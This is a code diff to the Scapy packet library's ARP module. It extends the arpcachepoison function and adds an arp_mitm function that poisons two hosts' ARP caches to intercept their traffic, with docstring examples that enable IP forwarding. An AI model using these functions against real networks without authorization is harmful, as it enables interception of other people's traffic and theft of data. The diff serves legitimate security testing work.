@@ -52,6 +52,7 @@ from scapy.fields import (
     XShortEnumField,
     XShortField,
 )
+from scapy.interfaces import _GlobInterfaceType
 from scapy.libs.six import viewitems
 from scapy.packet import bind_layers, Packet
 from scapy.plist import (
@@ -60,7 +61,7 @@ from scapy.plist import (
     SndRcvList,
     _PacketList,
 )
-from scapy.sendrecv import sendp, srp, srp1
+from scapy.sendrecv import sendp, srp, srp1, srploop
 from scapy.utils import checksum, hexdump, hexstr, inet_ntoa, inet_aton, \
     mac2str, valid_mac, valid_net, valid_net6
 from scapy.compat import (
@@ -729,13 +730,39 @@ conf.l3types.register(ETH_P_ARP, ARP)
 
 
 @conf.commands.register
-def arpcachepoison(target, victim, interval=60):
-    # type: (str, str, int) -> None
-    """Poison target's cache with (victim's IP, your MAC) couple
-arpcachepoison(target, victim, [interval=60]) -> None
-"""
+def arpcachepoison(
+    target,  # type: str
+    addresses,  # type: Union[str, Tuple[str, str], List[Tuple[str, str]]]
+    interval=60,  # type: int
+):
+    # type: (...) -> None
+    """Poison target's ARP cache
+
+    :param addresses: Can be either a string, a tuple of a list of tuples.
+                      If it's a string, it's the IP to usurpate in the victim,
+                      with the local interface's MAC. If it's a tuple,
+                      it's ("IP", "MAC"). It it's a list, it's [("IP", "MAC")]
+
+    Examples for target "192.168.0.2"::
+
+        >>> arpcachepoison("192.168.0.2", "192.168.0.1")
+        >>> arpcachepoison("192.168.0.2", ("192.168.0.1", get_if_hwaddr("virbr0")))
+        >>> arpcachepoison("192.168.0.2", [("192.168.0.1", get_if_hwaddr("virbr0"),
+        ...                                ("192.168.0.2", "aa:aa:aa:aa:aa:aa")])
+
+    """
+    if isinstance(addresses, str):
+        couple_list = [(addresses, get_if_hwaddr(conf.route.route(target)[0]))]
+    elif isinstance(addresses, tuple):
+        couple_list = [addresses]
+    else:
+        couple_list = addresses
     tmac = getmacbyip(target)
-    p = Ether(dst=tmac) / ARP(op="who-has", psrc=victim, pdst=target)
+    p = [
+        Ether(dst=tmac, src=y) / ARP(op="who-has", psrc=x, pdst=target,
+                                     hwsrc=y, hwdst="ff:ff:ff:ff:ff:ff")
+        for x, y in couple_list
+    ]
     try:
         while True:
             sendp(p, iface_hint=target)
@@ -744,6 +771,78 @@ arpcachepoison(target, victim, [interval=60]) -> None
             time.sleep(interval)
     except KeyboardInterrupt:
         pass
+
+
+@conf.commands.register
+def arp_mitm(
+    ip1,  # type: str
+    ip2,  # type: str
+    mac1=None,  # type: Optional[str]
+    mac2=None,  # type: Optional[str]
+    target_mac=None,  # type: Optional[str]
+    iface=None,  # type: Optional[_GlobInterfaceType]
+    inter=3,  # type: int
+):
+    # type: (...) -> None
+    """ARP MitM: poison 2 target's ARP cache
+
+    :param ip1: IPv4 of the first machine
+    :param ip2: IPv4 of the second machine
+    :param mac1: MAC of the first machine (optional: will ARP otherwise)
+    :param mac2: MAC of the second machine (optional: will ARP otherwise)
+    :param target_mac: MAC of the attacker (optional: default to the interface's one)
+    :param iface: the network interface. (optional: default, route for ip1)
+
+    Example usage::
+
+        $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface
+        $ sysctl net.ipv4.ip_forward=1
+        $ sudo scapy
+        >>> arp_mitm("192.168.122.156", "192.168.122.17")
+
+    Remember to change the sysctl settings back..
+    """
+    if not iface:
+        iface = conf.route.route(ip1)[0]
+    if not target_mac:
+        target_mac = get_if_hwaddr(iface)
+    if mac1 is None:
+        mac1 = getmacbyip(ip1)
+        if not mac1:
+            print("Can't resolve mac for %s" % ip1)
+            return
+    if mac2 is None:
+        mac2 = getmacbyip(ip2)
+        if not mac2:
+            print("Can't resolve mac for %s" % ip2)
+            return
+    print("MITM on %s: %s <--> %s <--> %s" % (iface, mac1, target_mac, mac2))
+    # We loop who-has requests
+    srploop(
+        [
+            Ether(dst=mac1, src=target_mac) /
+            ARP(op="who-has", psrc=ip2, pdst=ip1,
+                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff"),
+            Ether(dst=mac2, src=target_mac) /
+            ARP(op="who-has", psrc=ip1, pdst=ip2,
+                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff")
+        ],
+        filter="arp and arp[7] = 2",
+        inter=inter,
+        iface=iface,
+        timeout=0.5,
+        verbose=1,
+        store=0,
+    )
+    print("Restoring...")
+    sendp([
+        Ether(dst=mac1, src=target_mac) /
+        ARP(op="who-has", psrc=ip2, pdst=ip1,
+            hwsrc=mac2, hwdst="ff:ff:ff:ff:ff:ff"),
+        Ether(dst=mac2, src=target_mac) /
+        ARP(op="who-has", psrc=ip1, pdst=ip2,
+            hwsrc=mac1, hwdst="ff:ff:ff:ff:ff:ff")
+    ], iface=iface)
 
 
 class ARPingResult(SndRcvList):
